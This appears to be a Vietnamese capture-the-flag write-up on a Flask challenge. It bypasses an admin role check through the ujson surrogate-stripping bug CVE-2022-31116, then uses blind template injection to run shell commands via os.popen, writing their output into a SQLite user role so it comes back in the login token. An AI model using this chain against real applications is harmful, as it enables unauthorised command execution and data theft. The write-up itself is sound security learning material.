![image](https://github.com/user-attachments/assets/d9dcebbe-a5f6-4dc2-8d9a-e270919008d3)

Đọc source code thì thấy mục tiêu của bài là phải bypass vào admin để vào được `/render` để attack ssti
```python
@app.route('/render', methods=['POST'])
def dynamic_template():
    token = request.cookies.get('jwt_token')
    if token:
        try:
            decoded = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            role = decoded.get('role')

            if role != "admin":
                return jsonify(message="Admin only"), 403

            data = request.get_json()
            template = data.get("template")
            rendered_template = render_template_string(template)
            
            return jsonify(message="Done")

        except jwt.ExpiredSignatureError:
            return jsonify(message="Token has expired."), 401
        except jwt.InvalidTokenError:
            return jsonify(message="Invalid JWT."), 401
        except Exception as e:
            return jsonify(message=str(e)), 500
    else:
        return jsonify(message="Where is your token?"), 401
```

Lúc đầu mình định làm theo hướng bypass jwt nhưng sau một hồi tìm kiếm thì không thấy vuln gì. Chuyển sang tìm chỗ khác thì thấy `ujson.loads` có [CVE-2022-31116](https://security.snyk.io/vuln/SNYK-PYTHON-UJSON-2942122) . Về cơ bản của CVE này là khi chèn một số giá trị escape unicode vào thì `ujson.load` sẽ xóa giá trị đó đi.
```python
>>> ujson.loads(r'"\uD800"')
' '
>>> ujson.loads(r'"\uD800hello"')
'hello'

# An unpaired low surrogate character is preserved.
>>> ujson.loads(r'"\uDC00"')
'\udc00'
```

Qua đó mà có thể bypass check admin. Build trên local để test payload

![image](https://github.com/user-attachments/assets/86e6ed7a-d9f0-4227-bb08-4c53d9f8cb84)

Ở đây mình có setup debug thì thấy sau khi đi qua hàm `ujson.load` đã được chuyển thành `admin`

![image](https://github.com/user-attachments/assets/b0a23c89-4523-4b73-82c6-be71f52cd361)

Thực hiện đang nhập vào thì đã vào đc trang `/render`

Do route `/render` không gửi về nội dung sau khi render template nên mình đã thử các payload blinding nhưng trên server không có curl, wget thì bị xóa đi lúc build, dns thì bị chặn. Giờ chỉ còn cách là sử dụng timing check, việc viết script mất khá là nhiều thời gian. Sau khi xem lại source code thì mình tìm được một hướng mới. Do khi login sẽ được trả về token phần payload có chứa role, ta có thể tận dụng chèn output của shell sau khi chạy vào đây. Ý tưởng là viết code python để insert dữ liệu sau khi chạy command vào giá trị trường role của một user, sử dụng module `sqlite` và `os` có sẵn.

```python
import sqlite3
import os

def connect_to_db(db_file):
    try:
        conn = sqlite3.connect(db_file, check_same_thread=False)
        print "Connected to SQLite database successfully"
        return conn
    except sqlite3.Error as e:
        print "Error connecting to database:", e
        return None
output = str(os.popen("ls /app").read())
database_file = "database.db"
connection = connect_to_db(database_file)
cursor = connection.cursor()
query = "UPDATE users SET role = ? WHERE username = 'test'"
cursor.execute(query, (output,))
connection.commit()
connection.close()

```

Payload

![image](https://github.com/user-attachments/assets/2aae1a8e-58a6-4731-ae2f-8567c58faef6)

Mình có thực hiện mã hóa base64 để giúp đẩy code lên dễ hơn. Login vào để xem output

![image](https://github.com/user-attachments/assets/27631e22-8c48-455e-afad-cc934c3df6cf)

Oke vậy là đã thành công, giờ chỉ việc cat flag và submit thôi.

